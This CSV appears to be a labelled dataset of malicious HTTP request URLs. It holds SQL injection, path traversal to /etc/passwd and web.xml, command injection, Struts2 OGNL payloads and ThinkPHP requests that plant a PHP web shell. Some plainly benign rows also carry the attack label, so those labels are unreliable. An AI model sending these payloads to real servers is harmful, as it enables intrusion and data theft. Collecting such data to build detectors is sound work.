request_url,status
f_areacode=(select(0)from(select(sleep(12)))v)/*'%2b(select(0)from(select(sleep(12)))v)%2b'%22%2b(select(0)from(select(sleep(12)))v)%2b%22*/&f_tag=2,1
f_areacode=0531&f_tag=../WEB-INF/web.xml,1
f_areacode=WEB-INF/web.xml&f_tag=2,1
f_areacode=0531&f_tag=/etc/passwd,1
f_areacode=0531&f_tag=../../../WEB-INF/web.xml;x%3d,1
f_areacode=0531&f_tag=WEB-INF/web.xml,1
f_areacode=../WEB-INF/web.xml;x%3d&f_tag=2,1
f_areacode=/etc/passwd&f_tag=2,1
f_areacode=0531&f_tag=../../../../../../WEB-INF/web.xml,1
f_areacode=file://etc/passwd&f_tag=2,1
f_areacode=../../../WEB-INF/web.xml&f_tag=2,1
f_areacode=0531&f_tag=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd,1
f_areacode=0531&f_tag=../WEB-INF/web.xml%3f,1
f_areacode=../../../../../WEB-INF/web.xml&f_tag=2,1
fid=/../..../..../WEB-INF/web.xml,1
fid=WEB-INF/web.xml,1
fid=../../../../../../WEB-INF/web.xml,1
fid=../../WEB-INF/web.xml%3f,1
fid=/WEB-INF/web.xml,1
f_areacode=0531&f_tag=../../../../../WEB-INF/web.xml,1
f_areacode=/..%5c..WEB-INFweb.xml&f_tag=2,1
f_areacode=./WEB-INF/web.xml%3f&f_tag=2,1
f_areacode=/..%5c..WEB-INFweb.xml&f_tag=1,1
fid=/../..../..../WEB-INF/web.xml,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001001&page=1,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1,1
f_uri=/etc/passwd,1
f_uri=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd,1
page=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd,1
page=file://etc/passwd,1
page=WEB-INF%5cweb.xml,1
page=file://etc/passwd,1
page=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,1
page=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,1
page=WEB-INF%5cweb.xml,1
page=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/,1
page=/WEB-INF/web.xml,1
page=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/,1
page=/etc/passwd,1
page=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,1
page=WEB-INF%5cweb.xml,1
page=/WEB-INF/web.xml,1
page=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd,1
page=/etc/passwd,1
page=WEB-INF%5cweb.xml,1
page=WEB-INF/web.xml,1
page=/WEB-INF/web.xml,1
page=file://etc/passwd,1
page=/etc/passwd,1
/scripts/way-board/way-board.cgi?db=/etc/passwd%00,1
/scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name=%20;id;%20,1
/cgi-bin/htsearch?exclude=%60/etc/passwd%60,1
/xsql/demo/adhocsql/query.xsql?sql=select%20username%20from%20ALL_USERS,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001001&page=3,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=3,1
/phpPgAdmin/sql.php3?LIB_INC=1&btnDrop=No&goto=/etc/passwd,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=2,1
/eap/4.search.list?keyword=file%3A%2F%2F%2Fetc%2Fpasswd,1
/eap/4.search.list?keyword=WEB-INF%5Cweb.xml,1
/eap/4.search.list?keyword=WEB-INF%2Fweb.xml,1
/trsapp/add.html?isNeedTheme=0&flag=0&groupId=2&appId=%24%7B9999569%2B9999292%7D,1
/trsapp/add.html?isNeedTheme=0&flag=WEB-INF%5Cweb.xml&groupId=2&appId=1585,1
/eap/4.search.list?keyword=.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2F.%5C%5C.%2Fetc%2Fpasswd,1
"/index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E');",1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=3,1
/cgi-bin/frontend/js.php?module=../../../../../../../../../../../../../../../../../../windows/win.ini%00&file=frontend.js&language=en,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002001&page=4,1
/calendar_admin.pl?config=|cat%20/etc/passwd|,1
/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/winnt/win.ini,1
/scripts/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/cgi-bin/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/cgi-bin/simple/view_page?mv_arg=|cat%20/etc/passwd|,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/scripts/fake.cgi?arg=/dir/../../../../../../../../../../../windows/win.ini,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/?k=(%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D=false%2C%23_memberAccess.allowStaticMethodAccess=true%2C%23_memberAccess.excludeProperties=%7B%7D%2C%23a_str=%27814F60BD-F6DF-4227-%27%2C%23b_str=%2786F5-8D9FBF26A2EB%27%2C%23a_resp=%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23a_resp.getWriter%28%29.println%28%23a_str%2B%23b_str%29%2C%23a_resp.getWriter%28%29.flush%28%29%2C%23a_resp.getWriter%28%29.close%28%29)(meh)&z[(k)('meh')]=true,1
"/scripts/news.php4?nid=-12'+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*",1
/scripts/frontend/js.php?module=../../../../../../../../../../../../../../../../../../winnt/win.ini%00&file=frontend.js&language=en,1
"/?debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a=%27814F60BD-F6DF-4227-%27,%23b=%2786F5-8D9FBF26A2EB%27,%23resp=@org.apache.struts2.ServletActionContext@getResponse%28%29,%23resp.getWriter%28%29.println%28%23a.concat%28%23b%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29",1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1,1
/scripts/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/scripts/frontend/js.php?module=../../../../../../../../../../../../../../../../../../windows/win.ini%00&file=frontend.js&language=en,1
"/news.php4?nid=-12'+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*",1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/scripts/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/scripts/fake.cgi?arg=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini,1
/scripts/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
"/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='));?%3E",1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/asaancart/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/cgi-bin/frontend/js.php?module=../../../../../../../../../../../../../../../../../../windows/win.ini%00&file=frontend.js&language=en,1
"/trombi/photo.php?id=-9999/**/union/**/select/**/1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374--",1
"/photo.php?id=-9999/**/union/**/select/**/1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374--",1
/scripts/frontend/js.php?module=../../../../../../../../../../../../../../../../../../windows/win.ini%00&file=frontend.js&language=en,1
/htsearch?exclude=%60/etc/passwd%60,1
/scripts/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/cgi-bin/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/shop/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/asaancart/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
"/news.php4?nid=-12'+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6,7,8,9,10,11/*",1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../winnt/win.ini%00,1
/jact/front/front_main?sysid=21%20and%20(select%20*%20from(select(sleep(2)))x),1
"/jact/front/front_main?sysid=21%20LIMIT%200,1%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(0x447839773473516b,(SELECT%20(CASE%20WHEN%20(5059=5059)%20THEN%201%20ELSE%200%20END)),0x447839773473516b),NULL,NULL--%20end",1
/jact/front/front_main?sysid=2501%27%20and%20(select%20*%20from(select(sleep(2)))x)%20and%20%272501%27=%272501,1
/admin/template/v_edit.do?root=%2fweb-inf%2ft%2fcms%2fwww%2fsdas%2finclude&name=%2fweb-inf%2ft%2fcms%2fwww%2fsdas%2finclude%2f%e9%a1%b5%e5%a4%b4%e9%a1%b6%e6%a0%8f%e5%92%8c%e5%af%bc%e8%88%aa%e6%a0%8f.html,1
"/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E')",1
/cgi-bin/htsearch?exclude=%60/etc/passwd%60,1
/scripts/way-board/way-board.cgi?db=/etc/passwd%00,1
/PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd,1
http:/b2cmob.bxmedia.net/user.php?act=login,1
/HBSC/Services/zwfwzx/a_article.jsp?SiteID=96&aid=abcdda58-19f1-4bb5-bc2c-85c23632d7f4,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1,1
"/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E')",1
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=file://etc/passwd,1
/trsapp/add.html?isNeedTheme=0&flag=0&groupId=WEB-INF%5Cweb.xml%3F&appId=1585,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=2,1
/trsapp/add.html?isNeedTheme=0&flag=0&groupId=WEB-INF%2Fweb.xml&appId=1585,1
install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=2,1
/index.php?lang=Cn&index=0000,1
http:/b2cmob.bxmedia.net/user.php?act=login,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=1,1
/jcms/jcms_files/jcms1/web1/site/module/comment/opr_readfile.jsp?filename=../../../../../../WEB-INF/ini/merpserver.ini,1
/jcms_public/jcms_files/jcms1/web3/site/module/sitesearch/index.jsp?keyword=vc_title&columnid=0&keyvalue=1&webid=3&modalunitid=961&currpage=WEB-INF%2Fweb.xml,1
/vc/vc/columncount/tem/downfile.jsp?filename=/etc/passwd&savename=down.txt,1
/jcms/m_1_9/user/down.jsp?abspathfile=C:/boot.ini,1
/jcms_public/jcms_files/jcms1/web3/site/module/sitesearch/index.jsp?keyword=vc_title&columnid=0&keyvalue=1&webid=3&modalunitid=961&classword=%24%7B9999125%2B9999577%7D&currpage=,1
/jcms_public/jcms_files/jcms1/web3/site/module/changepage/gettitle.jsp?appid=1&showtip=WEB-INF%2Fweb.xml%3F&titlelimit=18&webid=3&cataid=108&catatype=2&position=next&infoid=4263,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001001&page=2,1
/index.php?lang=Cn&index=0000,1
http:/www.sddkj.gov.cn/index.php?lang=Cn&index=0000,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001004&page=1,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018001001&page=3,1
/trsapp/appWeb.do?method=WEB-INF%2Fweb.xml%3F&NAME=&checkCode=&themeId=0&TITLE=&TELEPHONE=&EMAIL=&CONTENT=&sub_dep=4&POSTCODE=&appId=1585&isNeedTheme=&groupId=2,1
/trsapp/appWeb.do?method=WEB-INF%2Fweb.xml&NAME=&checkCode=&themeId=0&TITLE=&TELEPHONE=&EMAIL=&CONTENT=&sub_dep=4&POSTCODE=&appId=1585&isNeedTheme=&groupId=2,1
/HBSC/Services/zwfwzx/a_list.jsp?key=018002005&page=2,1
/trsapp/appWeb.do?method=saveAppData&NAME=&checkCode=%24%7B9999387%2B9999732%7D&themeId=0&TITLE=&TELEPHONE=&EMAIL=&CONTENT=&sub_dep=4&POSTCODE=&appId=1585&isNeedTheme=&groupId=2,1
/trsapp/appWeb.do?method=saveAppData&NAME=&checkCode=&themeId=0&TITLE=WEB-INF%2Fweb.xml%3F&TELEPHONE=&EMAIL=&CONTENT=&sub_dep=4&POSTCODE=&appId=1585&isNeedTheme=&groupId=2,1
/cgi-bin/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../windows/win.ini%00,1
/frontend/js.php?module=../../../../../../../../../../../../../../../../../../winnt/win.ini%00&file=frontend.js&language=en,1
/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/scripts/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/shop/libs/smarty_ajax/index.php?_=&f=update_intro&page=../../../../../../../../../../../../../../../../../../boot.ini%00,1
/phf?QALIAS=x%0a/bin/cat%20/etc/passwd,1
/calendar_admin.pl?config=|cat%20/etc/passwd|,1
/cgi-bin/calendar_admin.pl?config=|cat%20/etc/passwd|,1
/htsearch?exclude=%60/etc/passwd%60,1
